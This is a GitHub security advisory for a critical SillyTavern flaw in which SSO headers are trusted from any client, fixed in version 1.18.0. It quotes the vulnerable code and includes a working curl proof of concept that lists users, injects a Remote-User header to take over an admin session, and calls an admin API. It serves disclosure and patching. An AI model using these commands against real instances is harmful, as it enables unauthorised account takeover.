# [C] SillyTavern has Authentication Bypass via SSO Header Injection

## Summary
Severity: Critical
Advisory: GHSA-gxx6-h3g6-vwjh
CVE: CVE-2026-44649
CWE: CWE-290, CWE-306, CWE-346, CWE-807
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-12
Source: https://github.com/advisories/GHSA-gxx6-h3g6-vwjh
Type: github-advisory

## Affected
- npm: `sillytavern` — affected >=0 <1.18.0

## Details
## Resolution

SillyTavern 1.18.0 now includes a configuration option to limit which IP addresses can authorize using SSO headers, limiting to just loopback addresses by default. A setting can be customized according to user's needs.

Documentation: https://docs.sillytavern.app/administration/sso/

## Summary

SillyTavern accepts `Remote-User` (Authelia) and `X-Authentik-Username` (Authentik) HTTP
headers to automatically log in users when SSO is configured. There is no validation that
these headers originate from a trusted reverse proxy. Any network client that can reach
the SillyTavern port directly can inject these headers and authenticate as any user,
including administrators, without a password. This vulnerability is exploitable only when `sso.autheliaAuth: true` or
`sso.authentikAuth: true` is set in `config.yaml` (both default to `false`).

### Detials

SillyTavern implements header-based SSO for Authelia and Authentik. When enabled, the
`tryAutoLogin` function (called on every request to `/login`) invokes `headerUserLogin`,
which reads an HTTP header set by the upstream proxy and automatically creates an
authenticated session for the matching user:

`src/users.js:779-801`:

```js
async function headerUserLogin(request, header = 'Remote-User') {
    if (!request.session) { return false; }

    const remoteUser = request.get(header);  // reads any header from any client
    if (!remoteUser) { return false; }

    const userHandles = await getAllUserHandles();
    for (const userHandle of userHandles) {
        if (remoteUser.toLowerCase() === userHandle) {
            const user = await storage.getItem(toKey(userHandle));
            if (user && user.enabled) {
                request.session.handle = userHandle; 
                return true;
            }
        }
    }
    return false;
}
```

`request.get(header)` is Express's wrapper for `req.headers[name.toLowerCase()]`.
Express does not distinguish between headers set by a trusted upstream proxy and headers
injected by the end client. Without an IP allowlist check, any client can set
`Remote-User: ` and receive an authenticated session cookie.

### User Enumeration Pre-Condition

The `/api/users/list` endpoint is registered before `requireLoginMiddleware` in
`src/server-main.js:236`, making it publicly accessible without authentication:

`src/server-main.js:236,239`:
```js
app.use('/api/users', usersPublicRouter);  // line 236 (public)
app.use(requireLoginMiddleware);           // line 239 (auth gate)
```

`src/endpoints/users-public.js:26-57`:
```js
router.post('/list', async (_request, response) => {
    if (DISCREET_LOGIN) { return response.sendStatus(204); }
    const users = await storage.values(x => x.key.startsWith(KEY_PREFIX));
    return response.json(viewModels);  // returns handle, name, avatar, admin, password flags
});
```

This allows an attacker to enumerate all user handles (including admin handles) without
any prior credentials.

## PoC

```bash
TARGET="http://localhost:8000"

# enumerate users
curl -s -X POST "$TARGET/api/users/list" -H "Content-Type: application/json" -d '{}'

# inject Remote-User header, receive authsession
curl -s -L \
  -H "Remote-User: admin-user" \
  -c /tmp/st-session.txt \
  "$TARGET/login"


# obtain CSRF token, call admin API
TOKEN=$(curl -s -b /tmp/st-session.txt "$TARGET/csrf-token" | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

curl -s -X POST "$TARGET/api/users/admin/get" \
  -H "Content-Type: application/json" \
  -H "X-CSRF-Token: $TOKEN" \
  -b /tmp/st-session.txt \
  -d '{}'
```

---

## Impact

An account takeover, allowing an attacker to do anything a legitimately authorized user can do.

## References
- https://github.com/SillyTavern/SillyTavern/security/advisories/GHSA-gxx6-h3g6-vwjh
- https://nvd.nist.gov/vuln/detail/CVE-2026-44649
- https://github.com/SillyTavern/SillyTavern
- https://github.com/SillyTavern/SillyTavern/releases/tag/1.18.0
